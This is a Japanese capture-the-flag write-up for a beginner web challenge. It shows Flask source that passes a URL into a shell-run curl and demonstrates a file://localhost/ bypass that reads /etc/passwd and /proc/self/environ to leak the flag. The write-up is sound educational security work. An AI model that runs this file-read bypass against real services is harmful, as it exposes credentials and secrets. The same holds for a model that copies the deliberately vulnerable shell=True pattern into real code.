# ssrforlfi

## 問題文
SSRF？ LFI？ ひょっとしてRCE？  
[https://ssrforlfi.beginners.seccon.games](https://ssrforlfi.beginners.seccon.games)  
[ssrforlfi.tar.gz](files/ssrforlfi.tar.gz) 0a1fdf267d06a10949c09983834476a8b0aa84a5  

## 難易度
**easy**  

## 作問にあたって
問題文にある通り、SSRF、LFI、RCEといった脆弱性を取捨選択するbeginner問題として作りました。  
調べる要素があるとのことでeasyに格上げになりました。  
ググると解けます。  

## 解法
アクセスするとクエリパラメータ`?url=`で、指定したURLを閲覧できるサービスのようだ。  
```bash
$ curl 'https://ssrforlfi.beginners.seccon.games'
Welcome to Website Viewer.<br><code>?url=http://example.com/</code>
```
試しに`http://example.com`を指定してみる。  
```bash
$ curl 'https://ssrforlfi.beginners.seccon.games?url=http://example.com'
<!doctype html>
<html>
<head>
    <title>Example Domain</title>
~~~
```
取得出来ているようだ。  
ソースが配布されているため見ると、以下の通りであった。  
```python
import os
import re
import subprocess
from flask import Flask, request

app = Flask(__name__)


@app.route("/")
def ssrforlfi():
    url = request.args.get("url")
    if not url:
        return "Welcome to Website Viewer.<br><code>?url=http://example.com/</code>"

    # Allow only a-z, ", (, ), ., /, :, ;, <, >, @, |
    if not re.match('^[a-z"()./:;<>@|]*$', url):
        return "Invalid URL ;("

    # SSRF & LFI protection
    if url.startswith("http://") or url.startswith("https://"):
        if "localhost" in url:
            return "Detected SSRF ;("
    elif url.startswith("file://"):
        path = url[7:]
        if os.path.exists(path) or ".." in path:
            return "Detected LFI ;("
    else:
        # Block other schemes
        return "Invalid Scheme ;("

    try:
        # RCE ?
        proc = subprocess.run(
            f"curl '{url}'",
            capture_output=True,
            shell=True,
            text=True,
            timeout=1,
        )
    except subprocess.TimeoutExpired:
        return "Timeout ;("
    if proc.returncode != 0:
        return "Error ;("
    return proc.stdout


if __name__ == "__main__":
    app.run(debug=True, host="0.0.0.0", port=4989)
```
クエリに指定するURLには`^[a-z"()./:;<>@|]*$`にマッチする文字のみが利用できる。  
さらにSSRFとLFIの防止として、`http://`や`https://`では`localhost`へのアクセス禁止、`file://`では`os.path.exists(path)`で存在するファイルへのアクセス禁止が行われている。  
その後に`subprocess.run`にURLが渡り、curlされている。  
この箇所でのOSコマンドインジェクション(RCE)も怪しい。  
さらに、配布ファイルからフラグは環境変数にあることがわかる。  
つまり`/proc/self/environ`を読み取ることができればゴールとなる。  
RCEはクエリに指定できる文字の制限があるため厳しく、SSRFでファイルシステムにアクセスすることは難易度が高い。  
LFIでファイルを読み出す方針が最も簡単そうだ。  
そのためには`os.path.exists(path)`をバイパスする必要がある。  
Pythonでファイルが存在しないと判定され、curlでファイルが読み取れるパスの記法はないだろうか？
「file scheme」のようにGoogle検索し、[RFC 8089](https://datatracker.ietf.org/doc/html/rfc8089)などを読むと`file://hostname/path/to/file`でもアクセスできることがわかる(Wikipediaでもよい笑)。  
以下のように試してみる。  
```bash
$ curl 'file://localhost/etc/passwd'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
~~~
```
ファイルが読み取れた。  
Pythonでは`file://`が取り除かれているので、`localhost/etc/passwd`など存在するはずもない。  
この方式で`file://localhost/proc/self/environ`を読み取ればよい。  
```bash
$ curl 'https://ssrforlfi.beginners.seccon.games?url=file://localhost/proc/self/environ' -o -
UWSGI_ORIGINAL_PROC_NAME=uwsgiHOSTNAME=a84e51bef68dHOME=/home/ssrforlfiPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binLANG=C.UTF-8DEBIAN_FRONTEND=noninteractivePWD=/var/wwwTZ=Asia/TokyoUWSGI_RELOADS=0FLAG=ctf4b{1_7h1nk_bl0ck3d_b07h_55rf_4nd_lf1}
```
flagが得られた。  

## ctf4b{1_7h1nk_bl0ck3d_b07h_55rf_4nd_lf1}